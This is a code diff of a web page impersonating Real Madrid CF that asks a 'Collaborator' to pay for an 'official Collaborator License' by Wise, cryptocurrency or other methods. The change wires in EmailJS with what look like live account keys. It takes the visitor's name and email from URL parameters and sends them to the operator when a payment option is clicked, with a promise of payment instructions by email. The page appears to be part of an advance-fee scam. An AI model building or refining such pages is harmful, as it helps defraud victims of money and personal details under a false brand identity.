@@ -4,70 +4,81 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Complete Registration – Real Madrid CF</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      padding: 30px;
-      text-align: center;
+      font-family: 'Segoe UI', sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 40px 15px;
     }
     .container {
+      max-width: 600px;
       background: white;
-      max-width: 500px;
+      padding: 40px;
       margin: auto;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+      border-radius: 14px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+      text-align: center;
     }
     .logo {
-      width: 100px;
-      margin-bottom: 20px;
+      width: 90px;
+      margin-bottom: 25px;
     }
     h2 {
-      margin-top: 0;
+      margin: 10px 0 20px;
+      font-size: 24px;
+    }
+    p {
+      color: #333;
+      font-size: 16px;
+    }
+    .payment-options {
+      margin-top: 30px;
     }
     .payment-options button {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
+      background: #ffffff;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 14px 20px;
       font-size: 16px;
       display: flex;
       align-items: center;
       justify-content: flex-start;
-      border: 1px solid #ccc;
-      border-radius: 8px;
+      margin: 10px 0;
       cursor: pointer;
-      transition: background 0.2s;
-      background: #fff;
-    }
-    .payment-options img {
-      width: 28px;
-      height: 28px;
-      margin-right: 12px;
+      transition: all 0.2s ease;
     }
     .payment-options button:hover {
       background: #f0f0f0;
     }
+    .payment-options img {
+      width: 28px;
+      margin-right: 14px;
+    }
     .thank-you {
       display: none;
       margin-top: 30px;
-      background: #e9ffe9;
       padding: 20px;
       border-radius: 10px;
-      color: #2a662a;
+      background: #e9fbe9;
+      color: #2e662e;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/5/56/Real_Madrid_CF.svg/1200px-Real_Madrid_CF.svg.png" alt="Real Madrid Logo" class="logo" />
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/5/56/Real_Madrid_CF.svg/1200px-Real_Madrid_CF.svg.png" class="logo" alt="Real Madrid Logo" />
+    
     <h2>Complete Your Registration</h2>
-    <p id="welcome-text">Welcome, Francois Etchart. To finalize your registration and receive your official Collaborator License, please select your preferred payment method below.</p>
+    <p id="welcome-message">Welcome, <span id="displayName">Collaborator</span>. To finalize your registration and receive your official Collaborator License, please select your preferred payment method below.</p>
 
     <form id="paymentForm">
-      <!-- Hidden Tracking Fields -->
-      <input type="hidden" name="full_name" value="Francois Etchart" />
-      <input type="hidden" name="email" value="francois@example.com" />
+      <!-- Hidden dynamic fields -->
+      <input type="hidden" name="full_name" id="full_name" value="" />
+      <input type="hidden" name="email" id="email" value="" />
       <input type="hidden" name="payment_method" id="payment_method" value="" />
 
       <div class="payment-options">
@@ -80,7 +91,7 @@
         <button type="button" onclick="submitPayment('Wise')">
           <img src="https://seeklogo.com/images/W/wise-logo-5364E252C6-seeklogo.com.png" alt="Wise" /> Wise (TransferWise)
         </button>
-        <button type="button" onclick="submitPayment('Crypto')">
+        <button type="button" onclick="submitPayment('Cryptocurrency')">
           <img src="https://cdn-icons-png.flaticon.com/512/825/825500.png" alt="Crypto" /> Cryptocurrency
         </button>
       </div>
@@ -90,19 +101,37 @@
   </div>
 
   <script>
+    (function(){
+      emailjs.init("JWcOE8k4MMUEFNPy-");
+
+      // Optional: Pre-fill from query string like ?name=Francois&email=francois@example.com
+      const urlParams = new URLSearchParams(window.location.search);
+      const name = urlParams.get('name') || 'Collaborator';
+      const email = urlParams.get('email') || '';
+
+      document.getElementById('displayName').textContent = name;
+      document.getElementById('full_name').value = name;
+      document.getElementById('email').value = email;
+    })();
+
     function submitPayment(method) {
       document.getElementById("payment_method").value = method;
 
-      // Simulate sending data via EmailJS or backend here
-
-      // Show confirmation message
-      const thankYou = document.getElementById("thankYouMessage");
-      thankYou.innerText = `Thank you. Payment instructions for ${method} will be sent to your registered email shortly.`;
-      thankYou.style.display = "block";
-
-      // Optionally disable buttons after selection
-      const buttons = document.querySelectorAll(".payment-options button");
-      buttons.forEach(btn => btn.disabled = true);
+      emailjs.send("service_96jc01n", "template_uikbtgh", {
+        full_name: document.getElementById("full_name").value,
+        email: document.getElementById("email").value,
+        payment_method: method
+      })
+      .then(() => {
+        document.querySelector(".payment-options").style.display = "none";
+        document.getElementById("thankYouMessage").style.display = "block";
+        document.getElementById("thankYouMessage").innerText = 
+          `Thank you. Payment instructions for ${method} will be sent to your registered email shortly.`;
+      })
+      .catch((error) => {
+        alert("Failed to send. Please try again later.");
+        console.error("EmailJS Error:", error);
+      });
     }
   </script>
 </body>
